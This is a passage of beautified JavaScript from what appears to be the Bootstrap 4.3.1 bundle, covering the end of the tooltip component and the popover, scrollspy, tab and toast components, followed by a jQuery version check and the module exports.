            this._cleanTipClass(),
            this.addAttachmentClass(this._getAttachment(e.placement));
        }),
        (i._fixTransition = function t() {
          var n = this.getTipElement(),
            i = this.config.animation;
          null === n.getAttribute("x-placement") &&
            (e(n).removeClass(tW.FADE),
            (this.config.animation = !1),
            this.hide(),
            this.show(),
            (this.config.animation = i));
        }),
        (t._jQueryInterface = function n(i) {
          return this.each(function () {
            var n = e(this).data(tD);
            if (
              !(!n && /dispose|hide/.test(i)) &&
              (n ||
                ((n = new t(this, "object" == typeof i && i)),
                e(this).data(tD, n)),
              "string" == typeof i)
            ) {
              if (void 0 === n[i])
                throw TypeError('No method named "' + i + '"');
              n[i]();
            }
          });
        }),
        r(t, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
          {
            key: "Default",
            get: function t() {
              return tH;
            },
          },
          {
            key: "NAME",
            get: function t() {
              return tC;
            },
          },
          {
            key: "DATA_KEY",
            get: function t() {
              return tD;
            },
          },
          {
            key: "Event",
            get: function t() {
              return t$;
            },
          },
          {
            key: "EVENT_KEY",
            get: function t() {
              return tO;
            },
          },
          {
            key: "DefaultType",
            get: function t() {
              return tw;
            },
          },
        ]),
        t
      );
    })();
  (e.fn[tC] = tU._jQueryInterface),
    (e.fn[tC].Constructor = tU),
    (e.fn[tC].noConflict = function () {
      return (e.fn[tC] = ty), tU._jQueryInterface;
    });
  var tF = "popover",
    tM = "bs.popover",
    tj = "." + tM,
    t_ = e.fn[tF],
    tG = "bs-popover",
    tB = RegExp("(^|\\s)" + tG + "\\S+", "g"),
    tK = o({}, tU.Default, {
      placement: "right",
      trigger: "click",
      content: "",
      template:
        '<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
    }),
    tx = o({}, tU.DefaultType, { content: "(string|element|function)" }),
    tq = { FADE: "fade", SHOW: "show" },
    tQ = { TITLE: ".popover-header", CONTENT: ".popover-body" },
    tY = {
      HIDE: "hide" + tj,
      HIDDEN: "hidden" + tj,
      SHOW: "show" + tj,
      SHOWN: "shown" + tj,
      INSERTED: "inserted" + tj,
      CLICK: "click" + tj,
      FOCUSIN: "focusin" + tj,
      FOCUSOUT: "focusout" + tj,
      MOUSEENTER: "mouseenter" + tj,
      MOUSELEAVE: "mouseleave" + tj,
    },
    tX = (function (t) {
      function n() {
        return t.apply(this, arguments) || this;
      }
      (i = n),
        (s = t),
        (i.prototype = Object.create(s.prototype)),
        (i.prototype.constructor = i),
        (i.__proto__ = s);
      var i,
        s,
        o = n.prototype;
      return (
        (o.isWithContent = function t() {
          return this.getTitle() || this._getContent();
        }),
        (o.addAttachmentClass = function t(n) {
          e(this.getTipElement()).addClass(tG + "-" + n);
        }),
        (o.getTipElement = function t() {
          return (this.tip = this.tip || e(this.config.template)[0]), this.tip;
        }),
        (o.setContent = function t() {
          var n = e(this.getTipElement());
          this.setElementContent(n.find(tQ.TITLE), this.getTitle());
          var i = this._getContent();
          "function" == typeof i && (i = i.call(this.element)),
            this.setElementContent(n.find(tQ.CONTENT), i),
            n.removeClass(tq.FADE + " " + tq.SHOW);
        }),
        (o._getContent = function t() {
          return (
            this.element.getAttribute("data-content") || this.config.content
          );
        }),
        (o._cleanTipClass = function t() {
          var n = e(this.getTipElement()),
            i = n.attr("class").match(tB);
          null !== i && i.length > 0 && n.removeClass(i.join(""));
        }),
        (n._jQueryInterface = function t(i) {
          return this.each(function () {
            var t = e(this).data(tM);
            if (
              !(!t && /dispose|hide/.test(i)) &&
              (t ||
                ((t = new n(this, "object" == typeof i ? i : null)),
                e(this).data(tM, t)),
              "string" == typeof i)
            ) {
              if (void 0 === t[i])
                throw TypeError('No method named "' + i + '"');
              t[i]();
            }
          });
        }),
        r(n, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
          {
            key: "Default",
            get: function t() {
              return tK;
            },
          },
          {
            key: "NAME",
            get: function t() {
              return tF;
            },
          },
          {
            key: "DATA_KEY",
            get: function t() {
              return tM;
            },
          },
          {
            key: "Event",
            get: function t() {
              return tY;
            },
          },
          {
            key: "EVENT_KEY",
            get: function t() {
              return tj;
            },
          },
          {
            key: "DefaultType",
            get: function t() {
              return tx;
            },
          },
        ]),
        n
      );
    })(tU);
  (e.fn[tF] = tX._jQueryInterface),
    (e.fn[tF].Constructor = tX),
    (e.fn[tF].noConflict = function () {
      return (e.fn[tF] = t_), tX._jQueryInterface;
    });
  var t1 = "scrollspy",
    t2 = "bs.scrollspy",
    tz = "." + t2,
    t0 = e.fn[t1],
    t7 = { offset: 10, method: "auto", target: "" },
    t5 = { offset: "number", method: "string", target: "(string|element)" },
    t3 = {
      ACTIVATE: "activate" + tz,
      SCROLL: "scroll" + tz,
      LOAD_DATA_API: "load" + tz + ".data-api",
    },
    t9 = {
      DROPDOWN_ITEM: "dropdown-item",
      DROPDOWN_MENU: "dropdown-menu",
      ACTIVE: "active",
    },
    tJ = {
      DATA_SPY: '[data-spy="scroll"]',
      ACTIVE: ".active",
      NAV_LIST_GROUP: ".nav, .list-group",
      NAV_LINKS: ".nav-link",
      NAV_ITEMS: ".nav-item",
      LIST_ITEMS: ".list-group-item",
      DROPDOWN: ".dropdown",
      DROPDOWN_ITEMS: ".dropdown-item",
      DROPDOWN_TOGGLE: ".dropdown-toggle",
    },
    tZ = { OFFSET: "offset", POSITION: "position" },
    t6 = (function () {
      function t(t, n) {
        var i = this;
        (this._element = t),
          (this._scrollElement = "BODY" === t.tagName ? window : t),
          (this._config = this._getConfig(n)),
          (this._selector =
            this._config.target +
            " " +
            tJ.NAV_LINKS +
            "," +
            (this._config.target + " ") +
            tJ.LIST_ITEMS +
            "," +
            this._config.target +
            " " +
            tJ.DROPDOWN_ITEMS),
          (this._offsets = []),
          (this._targets = []),
          (this._activeTarget = null),
          (this._scrollHeight = 0),
          e(this._scrollElement).on(t3.SCROLL, function (t) {
            return i._process(t);
          }),
          this.refresh(),
          this._process();
      }
      var n = t.prototype;
      return (
        (n.refresh = function t() {
          var n = this,
            i =
              this._scrollElement === this._scrollElement.window
                ? tZ.OFFSET
                : tZ.POSITION,
            r = "auto" === this._config.method ? i : this._config.method,
            s = r === tZ.POSITION ? this._getScrollTop() : 0;
          (this._offsets = []),
            (this._targets = []),
            (this._scrollHeight = this._getScrollHeight()),
            [].slice
              .call(document.querySelectorAll(this._selector))
              .map(function (t) {
                var n,
                  i = c.getSelectorFromElement(t);
                if ((i && (n = document.querySelector(i)), n)) {
                  var o = n.getBoundingClientRect();
                  if (o.width || o.height) return [e(n)[r]().top + s, i];
                }
                return null;
              })
              .filter(function (t) {
                return t;
              })
              .sort(function (t, e) {
                return t[0] - e[0];
              })
              .forEach(function (t) {
                n._offsets.push(t[0]), n._targets.push(t[1]);
              });
        }),
        (n.dispose = function t() {
          e.removeData(this._element, t2),
            e(this._scrollElement).off(tz),
            (this._element = null),
            (this._scrollElement = null),
            (this._config = null),
            (this._selector = null),
            (this._offsets = null),
            (this._targets = null),
            (this._activeTarget = null),
            (this._scrollHeight = null);
        }),
        (n._getConfig = function t(n) {
          if (
            "string" !=
            typeof (n = o({}, t7, "object" == typeof n && n ? n : {})).target
          ) {
            var i = e(n.target).attr("id");
            i || ((i = c.getUID(t1)), e(n.target).attr("id", i)),
              (n.target = "#" + i);
          }
          return c.typeCheckConfig(t1, n, t5), n;
        }),
        (n._getScrollTop = function t() {
          return this._scrollElement === window
            ? this._scrollElement.pageYOffset
            : this._scrollElement.scrollTop;
        }),
        (n._getScrollHeight = function t() {
          return (
            this._scrollElement.scrollHeight ||
            Math.max(
              document.body.scrollHeight,
              document.documentElement.scrollHeight
            )
          );
        }),
        (n._getOffsetHeight = function t() {
          return this._scrollElement === window
            ? window.innerHeight
            : this._scrollElement.getBoundingClientRect().height;
        }),
        (n._process = function t() {
          var e = this._getScrollTop() + this._config.offset,
            n = this._getScrollHeight(),
            i = this._config.offset + n - this._getOffsetHeight();
          if ((this._scrollHeight !== n && this.refresh(), e >= i)) {
            var r = this._targets[this._targets.length - 1];
            this._activeTarget !== r && this._activate(r);
            return;
          }
          if (
            this._activeTarget &&
            e < this._offsets[0] &&
            this._offsets[0] > 0
          ) {
            (this._activeTarget = null), this._clear();
            return;
          }
          for (var s = this._offsets.length, o = s; o--; )
            this._activeTarget !== this._targets[o] &&
              e >= this._offsets[o] &&
              (void 0 === this._offsets[o + 1] || e < this._offsets[o + 1]) &&
              this._activate(this._targets[o]);
        }),
        (n._activate = function t(n) {
          (this._activeTarget = n), this._clear();
          var i = this._selector.split(",").map(function (t) {
              return (
                t + '[data-target="' + n + '"],' + t + '[href="' + n + '"]'
              );
            }),
            r = e([].slice.call(document.querySelectorAll(i.join(","))));
          r.hasClass(t9.DROPDOWN_ITEM)
            ? (r
                .closest(tJ.DROPDOWN)
                .find(tJ.DROPDOWN_TOGGLE)
                .addClass(t9.ACTIVE),
              r.addClass(t9.ACTIVE))
            : (r.addClass(t9.ACTIVE),
              r
                .parents(tJ.NAV_LIST_GROUP)
                .prev(tJ.NAV_LINKS + ", " + tJ.LIST_ITEMS)
                .addClass(t9.ACTIVE),
              r
                .parents(tJ.NAV_LIST_GROUP)
                .prev(tJ.NAV_ITEMS)
                .children(tJ.NAV_LINKS)
                .addClass(t9.ACTIVE)),
            e(this._scrollElement).trigger(t3.ACTIVATE, { relatedTarget: n });
        }),
        (n._clear = function t() {
          [].slice
            .call(document.querySelectorAll(this._selector))
            .filter(function (t) {
              return t.classList.contains(t9.ACTIVE);
            })
            .forEach(function (t) {
              return t.classList.remove(t9.ACTIVE);
            });
        }),
        (t._jQueryInterface = function n(i) {
          return this.each(function () {
            var n = e(this).data(t2);
            if (
              (n ||
                ((n = new t(this, "object" == typeof i && i)),
                e(this).data(t2, n)),
              "string" == typeof i)
            ) {
              if (void 0 === n[i])
                throw TypeError('No method named "' + i + '"');
              n[i]();
            }
          });
        }),
        r(t, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
          {
            key: "Default",
            get: function t() {
              return t7;
            },
          },
        ]),
        t
      );
    })();
  e(window).on(t3.LOAD_DATA_API, function () {
    for (
      var t = [].slice.call(document.querySelectorAll(tJ.DATA_SPY)),
        n = t.length,
        i = n;
      i--;

    ) {
      var r = e(t[i]);
      t6._jQueryInterface.call(r, r.data());
    }
  }),
    (e.fn[t1] = t6._jQueryInterface),
    (e.fn[t1].Constructor = t6),
    (e.fn[t1].noConflict = function () {
      return (e.fn[t1] = t0), t6._jQueryInterface;
    });
  var t4 = "bs.tab",
    et = "." + t4,
    ee = e.fn.tab,
    en = {
      HIDE: "hide" + et,
      HIDDEN: "hidden" + et,
      SHOW: "show" + et,
      SHOWN: "shown" + et,
      CLICK_DATA_API: "click" + et + ".data-api",
    },
    ei = {
      DROPDOWN_MENU: "dropdown-menu",
      ACTIVE: "active",
      DISABLED: "disabled",
      FADE: "fade",
      SHOW: "show",
    },
    er = {
      DROPDOWN: ".dropdown",
      NAV_LIST_GROUP: ".nav, .list-group",
      ACTIVE: ".active",
      ACTIVE_UL: "> li > .active",
      DATA_TOGGLE:
        '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]',
      DROPDOWN_TOGGLE: ".dropdown-toggle",
      DROPDOWN_ACTIVE_CHILD: "> .dropdown-menu .active",
    },
    es = (function () {
      function t(t) {
        this._element = t;
      }
      var n = t.prototype;
      return (
        (n.show = function t() {
          var n,
            i,
            r = this;
          if (
            !(
              (this._element.parentNode &&
                this._element.parentNode.nodeType === Node.ELEMENT_NODE &&
                e(this._element).hasClass(ei.ACTIVE)) ||
              e(this._element).hasClass(ei.DISABLED)
            )
          ) {
            var s = e(this._element).closest(er.NAV_LIST_GROUP)[0],
              o = c.getSelectorFromElement(this._element);
            if (s) {
              var a =
                "UL" === s.nodeName || "OL" === s.nodeName
                  ? er.ACTIVE_UL
                  : er.ACTIVE;
              i = (i = e.makeArray(e(s).find(a)))[i.length - 1];
            }
            var l = e.Event(en.HIDE, { relatedTarget: this._element }),
              h = e.Event(en.SHOW, { relatedTarget: i });
            if (
              (i && e(i).trigger(l),
              e(this._element).trigger(h),
              !(h.isDefaultPrevented() || l.isDefaultPrevented()))
            ) {
              o && (n = document.querySelector(o)),
                this._activate(this._element, s);
              var u = function t() {
                var n = e.Event(en.HIDDEN, { relatedTarget: r._element }),
                  s = e.Event(en.SHOWN, { relatedTarget: i });
                e(i).trigger(n), e(r._element).trigger(s);
              };
              n ? this._activate(n, n.parentNode, u) : u();
            }
          }
        }),
        (n.dispose = function t() {
          e.removeData(this._element, t4), (this._element = null);
        }),
        (n._activate = function t(n, i, r) {
          var s = this,
            o = (
              i && ("UL" === i.nodeName || "OL" === i.nodeName)
                ? e(i).find(er.ACTIVE_UL)
                : e(i).children(er.ACTIVE)
            )[0],
            a = r && o && e(o).hasClass(ei.FADE),
            l = function t() {
              return s._transitionComplete(n, o, r);
            };
          if (o && a) {
            var h = c.getTransitionDurationFromElement(o);
            e(o)
              .removeClass(ei.SHOW)
              .one(c.TRANSITION_END, l)
              .emulateTransitionEnd(h);
          } else l();
        }),
        (n._transitionComplete = function t(n, i, r) {
          if (i) {
            e(i).removeClass(ei.ACTIVE);
            var s = e(i.parentNode).find(er.DROPDOWN_ACTIVE_CHILD)[0];
            s && e(s).removeClass(ei.ACTIVE),
              "tab" === i.getAttribute("role") &&
                i.setAttribute("aria-selected", !1);
          }
          if (
            (e(n).addClass(ei.ACTIVE),
            "tab" === n.getAttribute("role") &&
              n.setAttribute("aria-selected", !0),
            c.reflow(n),
            n.classList.contains(ei.FADE) && n.classList.add(ei.SHOW),
            n.parentNode && e(n.parentNode).hasClass(ei.DROPDOWN_MENU))
          ) {
            var o = e(n).closest(er.DROPDOWN)[0];
            o &&
              e([].slice.call(o.querySelectorAll(er.DROPDOWN_TOGGLE))).addClass(
                ei.ACTIVE
              ),
              n.setAttribute("aria-expanded", !0);
          }
          r && r();
        }),
        (t._jQueryInterface = function n(i) {
          return this.each(function () {
            var n = e(this),
              r = n.data(t4);
            if (
              (r || ((r = new t(this)), n.data(t4, r)), "string" == typeof i)
            ) {
              if (void 0 === r[i])
                throw TypeError('No method named "' + i + '"');
              r[i]();
            }
          });
        }),
        r(t, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
        ]),
        t
      );
    })();
  e(document).on(en.CLICK_DATA_API, er.DATA_TOGGLE, function (t) {
    t.preventDefault(), es._jQueryInterface.call(e(this), "show");
  }),
    (e.fn.tab = es._jQueryInterface),
    (e.fn.tab.Constructor = es),
    (e.fn.tab.noConflict = function () {
      return (e.fn.tab = ee), es._jQueryInterface;
    });
  var eo = "toast",
    ea = "bs.toast",
    el = "." + ea,
    ec = e.fn[eo],
    eh = {
      CLICK_DISMISS: "click.dismiss" + el,
      HIDE: "hide" + el,
      HIDDEN: "hidden" + el,
      SHOW: "show" + el,
      SHOWN: "shown" + el,
    },
    eu = { FADE: "fade", HIDE: "hide", SHOW: "show", SHOWING: "showing" },
    ef = { animation: "boolean", autohide: "boolean", delay: "number" },
    e8 = { animation: !0, autohide: !0, delay: 500 },
    ed = { DATA_DISMISS: '[data-dismiss="toast"]' },
    eg = (function () {
      function t(t, e) {
        (this._element = t),
          (this._config = this._getConfig(e)),
          (this._timeout = null),
          this._setListeners();
      }
      var n = t.prototype;
      return (
        (n.show = function t() {
          var n = this;
          e(this._element).trigger(eh.SHOW),
            this._config.animation && this._element.classList.add(eu.FADE);
          var i = function t() {
            n._element.classList.remove(eu.SHOWING),
              n._element.classList.add(eu.SHOW),
              e(n._element).trigger(eh.SHOWN),
              n._config.autohide && n.hide();
          };
          if (
            (this._element.classList.remove(eu.HIDE),
            this._element.classList.add(eu.SHOWING),
            this._config.animation)
          ) {
            var r = c.getTransitionDurationFromElement(this._element);
            e(this._element).one(c.TRANSITION_END, i).emulateTransitionEnd(r);
          } else i();
        }),
        (n.hide = function t(n) {
          var i = this;
          this._element.classList.contains(eu.SHOW) &&
            (e(this._element).trigger(eh.HIDE),
            n
              ? this._close()
              : (this._timeout = setTimeout(function () {
                  i._close();
                }, this._config.delay)));
        }),
        (n.dispose = function t() {
          clearTimeout(this._timeout),
            (this._timeout = null),
            this._element.classList.contains(eu.SHOW) &&
              this._element.classList.remove(eu.SHOW),
            e(this._element).off(eh.CLICK_DISMISS),
            e.removeData(this._element, ea),
            (this._element = null),
            (this._config = null);
        }),
        (n._getConfig = function t(n) {
          return (
            (n = o(
              {},
              e8,
              e(this._element).data(),
              "object" == typeof n && n ? n : {}
            )),
            c.typeCheckConfig(eo, n, this.constructor.DefaultType),
            n
          );
        }),
        (n._setListeners = function t() {
          var n = this;
          e(this._element).on(eh.CLICK_DISMISS, ed.DATA_DISMISS, function () {
            return n.hide(!0);
          });
        }),
        (n._close = function t() {
          var n = this,
            i = function t() {
              n._element.classList.add(eu.HIDE),
                e(n._element).trigger(eh.HIDDEN);
            };
          if (
            (this._element.classList.remove(eu.SHOW), this._config.animation)
          ) {
            var r = c.getTransitionDurationFromElement(this._element);
            e(this._element).one(c.TRANSITION_END, i).emulateTransitionEnd(r);
          } else i();
        }),
        (t._jQueryInterface = function n(i) {
          return this.each(function () {
            var n = e(this),
              r = n.data(ea);
            if (
              (r ||
                ((r = new t(this, "object" == typeof i && i)), n.data(ea, r)),
              "string" == typeof i)
            ) {
              if (void 0 === r[i])
                throw TypeError('No method named "' + i + '"');
              r[i](this);
            }
          });
        }),
        r(t, null, [
          {
            key: "VERSION",
            get: function t() {
              return "4.3.1";
            },
          },
          {
            key: "DefaultType",
            get: function t() {
              return ef;
            },
          },
          {
            key: "Default",
            get: function t() {
              return e8;
            },
          },
        ]),
        t
      );
    })();
  (e.fn[eo] = eg._jQueryInterface),
    (e.fn[eo].Constructor = eg),
    (e.fn[eo].noConflict = function () {
      return (e.fn[eo] = ec), eg._jQueryInterface;
    }),
    (function () {
      if (void 0 === e)
        throw TypeError(
          "Bootstrap's JavaScript requires jQuery. jQuery must be included before Bootstrap's JavaScript."
        );
      var t = e.fn.jquery.split(" ")[0].split(".");
      if (
        (t[0] < 2 && t[1] < 9) ||
        (1 === t[0] && 9 === t[1] && t[2] < 1) ||
        t[0] >= 4
      )
        throw Error(
          "Bootstrap's JavaScript requires at least jQuery v1.9.1 but less than v4.0.0"
        );
    })(),
    (t.Util = c),
    (t.Alert = p),
    (t.Button = O),
    (t.Carousel = U),
    (t.Collapse = Y),
    (t.Dropdown = tl),
    (t.Modal = tE),
    (t.Popover = tX),
    (t.Scrollspy = t6),
    (t.Tab = es),
    (t.Toast = eg),
    (t.Tooltip = tU),
    Object.defineProperty(t, "__esModule", { value: !0 });
});
